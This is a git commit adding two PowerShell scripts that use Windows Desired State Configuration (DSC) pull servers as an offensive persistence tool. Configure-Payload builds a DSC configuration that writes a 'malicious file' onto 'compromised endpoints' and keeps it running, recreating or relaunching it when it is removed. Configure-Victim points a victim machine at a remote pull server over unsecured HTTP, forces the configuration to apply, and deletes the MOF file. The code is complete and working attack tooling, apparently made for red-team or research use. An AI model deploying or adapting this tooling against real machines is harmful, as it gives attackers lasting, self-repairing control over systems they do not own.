21211f743a5bf936bcdc0c4f49e924a1f7aa98fb
Matt Hastings <matt.hastings@tanium.com>
2015-09-28 23:16:58 -0400

    initial commit

---
+++ Configure-Payload.ps1
@@ -0,0 +1,126 @@
+﻿function Configure-Payload
+{
+<#
+.SYNOPSIS
+
+Configure DSC pull server for file and process persistence 
+
+.DESCRIPTION
+
+Script ensures a file is present and running on a compromised endpoint.
+
+Must be run on the DSC server before configuring any endpoints.
+
+Malicious file must be present server side at time of initial configuration.
+
+.PARAMETER SourceFile
+
+Local path to the malicious file that will persistent on compromised endpoints. 
+
+.PARAMETER DestinationPath
+
+Location on compromised endpoints where the contents of 'SourceFile' should be written on compromomised endpoints.  
+
+.PARAMETER Arguments
+
+Optionally specifies command line arguments provided to during execution.
+
+.EXAMPLE
+
+
+PS C:\> Configure-Payload -SourceFile C:\Windows\System32\calc.exe -DestinationPath C:\calc.exe
+
+Description
+-----------
+Server Side:
+Obtains contents of C:\Windows\System32\calc.exe and creates a new DSC configuration
+
+Victime Side:
+Creates file C:\calc.exe with contents of C:\Windows\System32\calc.exe and ensures file is running
+If file is deleted or process is stopped script will recreate file and/or relaunch process
+
+.EXAMPLE
+
+
+PS C:\> Configure-Payload -SourceFile C:\Windows\System32\calc.exe -DestinationPath C:\calc.exe -Arguments "foo bar"
+
+Description
+-----------
+
+Same process followed as described above except process is launched with parameters provided in Arguments variable
+
+
+#>
+    
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory = $True)]
+        [String] $SourceFile,
+
+        [Parameter(Mandatory = $True)]
+        [String] $DestinationPath,
+
+        [Parameter(Mandatory = $False)]
+        [String] $Arguments 
+
+    )
+    
+    $FileBytes = [System.IO.File]::ReadAllBytes($SourceFile)
+    $GUID = [guid]::NewGuid()
+    
+    Write-Host "GUID for Config:" $GUID
+
+    
+    Configuration SetupPullConfig {
+        Param(
+        [Parameter(Mandatory = $True)]
+        [String[]] $NodeGUID
+
+        )
+        Node $NodeGUID { 
+            Script Ensure-File {
+                SetScript = $([string]{
+                    $bytes = [byte[]]($FileBytes).split(' ')
+                    [System.IO.File]::WriteAllBytes($DestinationPath, $bytes)
+                }).Replace('$FileBytes', "'$FileBytes'").Replace('$DestinationPath', "'$DestinationPath'")
+                
+                TestScript = $([string]{
+                    Test-Path $DestinationPath
+                }).Replace('$DestinationPath', "'$DestinationPath'")
+
+                GetScript = {
+                    return @{
+                        GetScript = $GetScript
+                        SetScript = $SetScript
+                        TestScript = $TestScript
+                    }
+                }
+            }
+            Script Ensure-Process {
+                SetScript = $([string]{
+                    Start-Process $DestinationPath $Arguments
+                }).Replace('$DestinationPath', "'$DestinationPath'").Replace('$Arguments', "'$Arguments'")
+                TestScript = $([string]{
+                    #[System.IO.Path]::GetFileNameWithoutExtension($DestinationPath) | 
+                   # % {(Get-Process -Name $_ -ErrorAction SilentlyContinue) -ne $Null}
+                   #(get-process).Path | ? {$_} | ? {$_.tolower() -eq $DestinationPath.tolower()} | % {$_.tolower() -ne $DestinationPath.ToLower()}
+                   (get-process).path -contains $DestinationPath
+                }).Replace('$DestinationPath', "'$DestinationPath'")
+                    
+                GetScript = {
+                    return @{
+                        GetScript = $GetScript
+                        SetScript = $SetScript
+                        TestScript = $TestScript
+                    }
+                }
+            }        
+         
+        }
+    }
+
+    SetupPullConfig -NodeGUID $GUID -OutputPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration" #-DestinationPath $DestinationPath -SourceFile $SourceFile
+    
+    Write-Host "Generating Checksum"
+    New-DscChecksum -ConfigurationPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration\" -OutPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration"
+
+}                       
---
+++ Configure-Victim.ps1
@@ -0,0 +1,87 @@
+﻿function Configure-Victim
+{
+<#
+.SYNOPSIS
+
+Registers victim host with DSC pull server
+
+.DESCRIPTION
+
+Registers victim machine with DSC server, downloads and applies specified configuration (GUID), and defines the local configuration manager (LCM)
+
+.PARAMETER Guid
+
+GUID to be used to pull the correct configuration (GUID is generated previously, server side, when the configuration is created). 
+
+.PARAMETER DSCServer
+
+Metwork address of the remote DSC server
+
+.PARAMETER MofPath
+
+Optional parameter of the temporary MOF file location. If  parameter is not supplied the file is written to C:\Windows\System32\Configuration\PullConfig.mof then deleted.
+
+
+.EXAMPLE
+
+WRITE EXAMPLES
+
+
+#>
+
+
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory = $True)]
+        [ValidateLength(36, 36)]
+        [String] $GUID,
+
+        [Parameter(Mandatory = $True)]
+        [String] $Server,
+
+        [Parameter(Mandatory = $False)]
+        [ValidatePattern('\.mof$')]
+        [String] $MofPath = "C:\Windows\System32\Configuration\PullConfig.mof"
+
+
+
+    )
+
+
+    Configuration ConfigurePullServer
+    {
+        param ($NodeId, $PullServer)    
+ 
+        LocalConfigurationManager
+        {
+            AllowModuleOverwrite = $True
+            ConfigurationID = $NodeId
+            # Minutes between target policy being implemented
+            ConfigurationModeFrequencyMins = 15 
+            ConfigurationMode = 'ApplyAndAutoCorrect'
+            # Minutes between pull server requests
+            RefreshFrequencyMins = 30
+            RebootNodeIfNeeded = $False
+            RefreshMode = 'Pull'
+            DownloadManagerName = 'WebDownloadManager'
+            DownloadManagerCustomData = (@{ServerUrl = "http://${PullServer}:8080/psdscpullserver.svc"; 
+                                            AllowUnsecureConnection = “TRUE”})
+         
+        }
+    }
+ 
+    Write-Host "Generating pull server configuration"
+ 
+    ConfigurePullServer -NodeId $GUID -PullServer $Server -OutputPath $MOFPath 
+
+    Write-Host "Applying pull server settings"
+
+    Set-DscLocalConfigurationManager -path $MofPath -Verbose
+
+    # Force DSC to implement config 
+    Invoke-CimMethod -Namespace root/Microsoft/Windows/DesiredStateConfiguration -Cl MSFT_DSCLocalConfigurationManager -Method PerformRequiredConfigurationChecks -Arguments @{Flags = [System.UInt32]1}
+
+    #Delete MOF file and directory
+    Write-Host "Deleting MOF file"
+
+    Remove-Item -Path $MofPath -Force -Recurse
+}
